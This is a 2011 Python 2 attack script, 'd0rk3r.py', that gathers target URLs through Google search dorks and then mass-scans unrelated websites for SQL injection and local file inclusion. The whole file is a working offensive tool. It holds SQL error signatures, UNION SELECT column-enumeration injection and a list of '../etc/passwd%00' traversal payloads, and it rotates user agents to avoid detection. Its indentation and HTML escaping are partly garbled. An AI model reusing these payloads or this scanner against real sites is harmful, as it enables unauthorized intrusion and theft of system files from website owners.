#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname		: d0rk3r.py
# Coder		   : baltazar a.k.a b4ltazar &lt; b4ltazar@gmail.com&gt;
# Version		 : 0.1
# About		   : No proxy support in this version, will put it in next one ...
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, qk, marezzi, StRoNiX, t0r3x and all members of ex darkc0de.com and ljuska.org
#
#
# Example of use  : ./d0rk3r.py -i id= -s com -c redfront -f php -m 500
# U have two options, SQLi or LFI scanning .
# When found site vuln to sqli, then it try to find number of columns
# After scanning check d0rk3r.txt for more info
import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, time
from random import choice
from optparse import OptionParser
if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)
colMax = 20
log = "d0rk3r.txt"
logfile = open(log, "a")
threads = []
numthreads = 1
lfinumthreads =8
timeout = 4
socket.setdefaulttimeout(timeout)
W  = "\033[0m";
R  = "\033[31m";
G  = "\033[32m";
O  = "\033[33m";
B  = "\033[34m";
rSA = [2,3,4,5,6]
CXdic = {'blackle': '013269018370076798483:gg7jrrhpsy4',
		 'ssearch': '008548304570556886379:0vtwavbfaqe',
		 'redfront': '017478300291956931546:v0vo-1jh2y4',
		 'bitcomet': '003763893858882295225:hz92q2xruzy',
		 'dapirats': '002877699081652281083:klnfl5og4kg',
		 'darkc0de': '009758108896363993364:wnzqtk1afdo',
		 'googuuul': '014345598409501589908:mplknj4r1bu'}
SQLeD = {'MySQL': 'error in your SQL syntax',
		 'Oracle': 'ORA-01756',
		 'MiscError': 'SQL Error',
	 'MiscError2': 'mysql_fetch_row',
	 'MiscError3': 'num_rows',
		 'JDBC_CFM': 'Error Executing Database Query',
		 'JDBC_CFM2': 'SQLServer JDBC Driver',
		 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
		 'MSSQL_Uqm': 'Unclosed quotation mark',
		 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
		 'MS-Access_JETdb': 'Microsoft JET Database'}
lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
filetypes = ['php','php5','asp','aspx','jsp','htm','html','cfm']
header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
		  'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
		  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
gnum = 100
def logo():
	print G+"\n|---------------------------------------------------------------|"
		print "| b4ltazar[@]gmail[dot]com									  |"
		print "|   02/2011	 d0rk3r.py  v.0.1								|"
		print "|															   |"
		print "|---------------------------------------------------------------|\n"
	print "\n[-] %s\n" % time.strftime("%X")
def cxeSearch(go_inurl,go_site,go_cxe,go_ftype,maxc):
	uRLS = []
	counter = 0
	   	while counter &lt; int(maxc):
			  	jar = cookielib.FileCookieJar("cookies")
				query = 'q='+go_inurl+'+'+go_site+'+'+go_ftype
				results_web = 'http://www.google.com/cse?'+go_cxe+'&amp;'+query+'&amp;num='+str(gnum)+'&amp;hl=en&amp;lr=&amp;ie=UTF-8&amp;start=' + repr(counter) + '&amp;sa=N'
				request_web = urllib2.Request(results_web)
		agent = random.choice(header)
				request_web.add_header('User-Agent', agent)
		opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
				text = opener_web.open(request_web).read()
		strreg = re.compile('(?&lt;=href=")(.*?)(?=")')
				names = strreg.findall(text)
		counter += 100
				for name in names:
					  	if name not in uRLS:
							   	if re.search(r'\(', name) or re.search("&lt;", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
									   	pass
				elif re.search("google", name) or re.search("youtube", name) or re.search(".gov", name) or re.search("%", name):
									   	pass
				else:
									  	uRLS.append(name)
	tmpList = []; finalList = []
	print "[+] URLS (unsorted) :", len(uRLS)
		for entry in uRLS:
		try:
			t2host = entry.split("/",3)
			domain = t2host[2]
			if domain not in tmpList and "=" in entry:
				finalList.append(entry)
				tmpList.append(domain)
		except:
			pass
	print "[+] URLS (sorted)   :", len(finalList)
	return finalList
class injThread(threading.Thread):
		def __init__(self,hosts):
				self.hosts=hosts;self.fcount = 0
				self.check = True
				threading.Thread.__init__(self)
		def run (self):
				urls = list(self.hosts)
				for url in urls:
						try:
								if self.check == True:
										ClassicINJ(url)
								else:
										break
						except(KeyboardInterrupt,ValueError):
								pass
				self.fcount+=1
		def stop(self):
				self.check = False
class lfiThread(threading.Thread):
		def __init__(self,hosts):
				self.hosts=hosts;self.fcount = 0
				self.check = True
				threading.Thread.__init__(self)
		def run (self):
				urls = list(self.hosts)
				for url in urls:
						try:
								if self.check == True:
										ClassicLFI(url)
								else:
										break
						except(KeyboardInterrupt,ValueError):
								pass
				self.fcount+=1
		def stop(self):
				self.check = False
def ClassicINJ(url):
		EXT = "'"
		host = url+EXT
		try:
				source = urllib2.urlopen(host).read()
				for type,eMSG in SQLeD.items():
						if re.search(eMSG, source):
								print R+"\nw00t!,w00t!:", O+host, B+"Error:", type
				#logfile.write("\n"+host)
				findcol(url)
						else:
								pass
		except:
				pass
def findcol(url):
	print "\n[+] Attempting to find the number of columns ..."
	checkfor = []
	firstgo = "True"
	site = url+"+and+1=2+union+all+select+"
	makepretty = ""
	for a in xrange(0,colMax):
		darkc0de = "dark"+str(a)+"c0de"
		checkfor.append(darkc0de)
		if firstgo == "True":
			site = site+"0x"+darkc0de.encode("hex")
			firstgo = "False"
		else:
			site = site+",0x"+darkc0de.encode("hex")
		finalurl = site+"--"
		source = urllib2.urlopen(finalurl).read()
		for b in checkfor:
			colFound = re.findall(b,source)
			if len(colFound) &gt;= 1:
				print "\n[+] Column Length is:",len(checkfor)
				b = re.findall(("\d+"),b)
				print "[+] Found null column at column #:",b[0]
				firstgo = "True:"
				for c in xrange(0,len(checkfor)):
					if firstgo == "True":
						makepretty = makepretty+str(c)
						firstgo = "False"
					else:
						makepretty = makepretty+","+str(c)
				print "[+] Site URL:",url+"+and+1=2+union+all+select+"+makepretty+"--"
				url = url+"+and+1=2+union+all+select+"+makepretty+"--"
				url = url.replace(","+b[0]+",",",darkc0de,")
				url = url.replace("+"+b[0]+",","+"+"darkc0de,")
				url = url.replace(","+b[0],",darkc0de")
				print "[+] darkc0de URL:",url
				logfile.write("\n"+url)
def ClassicLFI(url):
	lfiurl = url.rsplit('=' ,1)[0]
	if lfiurl[-1] != "=":
		lfiurl = lfiurl + "="
	for lfi in lfis:
		print G+"[+] Checking:",lfiurl+lfi.replace("\n", "")
		#print
		try:
			check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
			if re.findall("root:x", check):
				print R+"w00t!,w00t!: ", O+lfiurl+lfi
				logfile.write("\n"+lfiurl+lfi)
		except:
				pass
parser = OptionParser()
parser.add_option("-i" ,type='string', dest='inurl',action='store', default="0wn3d_by_baltazar", help="inurl: operator")
parser.add_option("-s", type='string', dest='site',action='store', default="com", help="site: operator")
parser.add_option("-c", type='string', dest='cxe',action='store', default='redfront', help="custom search engine (blackle,ssearch,redfront,bitcomet,dapirats,darkc0de,googuuul)")
parser.add_option("-f", type='string', dest='filetype',action='store', default='php', help="server side language filetype")
parser.add_option("-m", type='string', dest='maxcount',action='store',default='500', help="max results (default 500)")
(options, args) = parser.parse_args()
logo()
if options.inurl != None:
	print B+"[+] inurl  :",options.inurl
	go_inurl = 'inurl:'+options.inurl
if options.inurl != None:
	if options.filetype in filetypes:
		print "[+] filetype  :",options.filetype
		go_ftype = 'inurl:'+options.filetype
	else:
		print "[+] inurl-filetype  : php"
		go_ftype = 'inurl:php'
if options.site != None:
	print "[+] site   :",options.site
	go_site = 'site:'+options.site
if options.cxe != None:
	if options.cxe in CXdic.keys():
		print "[+] CXE	:",CXdic[options.cxe]
		ccxe = CXdic[options.cxe]
	else:
		print "[-] CXE	: no Proper CXE defined, using redfront"
		ccxe = CXdic['redfront']
	go_cxe = 'cx='+ccxe
print "[+] MaxRes :",options.maxcount
cuRLS = cxeSearch(go_inurl,go_site,go_cxe,go_ftype,options.maxcount)
mnu = True
while mnu == True:
	print G+"\n[1] Injection Testing"
	print "[2] LFI Testing"
	print "[0] Exit\n"
	chce = raw_input(":")
	if chce == '1':
		print "\n[+] Preparing for SQLi scanning ... "
		print "[+] Can take a while ..."
		print "[!] Working ...\n"
		i = len(cuRLS) / int(numthreads)
		m = len(cuRLS) % int(numthreads)
		z = 0
		if len(threads) &lt;= numthreads:
			for x in range(0, int(numthreads)):
					sliced = cuRLS[x*i:(x+1)*i]
						if (z &lt; m):
							sliced.append(cuRLS[int(numthreads)*i+z])
								z += 1
				thread = injThread(sliced)
						thread.start()
						threads.append(thread)
		for thread in threads:
			thread.join()
	if chce == '2':
		print "\n[+] Preparing for LFI scanning ... "
		print "[+] Can take a while ..."
		print "[!] Working ...\n"
		i = len(cuRLS) / int(lfinumthreads)
		m = len(cuRLS) % int(lfinumthreads)
		z = 0
		if len(threads) &lt;= lfinumthreads:
			for x in range(0, int(lfinumthreads)):
					sliced = cuRLS[x*i:(x+1)*i]
						if (z &lt; m):
							sliced.append(cuRLS[int(lfinumthreads)*i+z])
								z += 1
				thread = lfiThread(sliced)
						thread.start()
						threads.append(thread)
		for thread in threads:
			thread.join()
	if chce == '0':
		print R+"\n[-] Exiting ..."
		mnu = False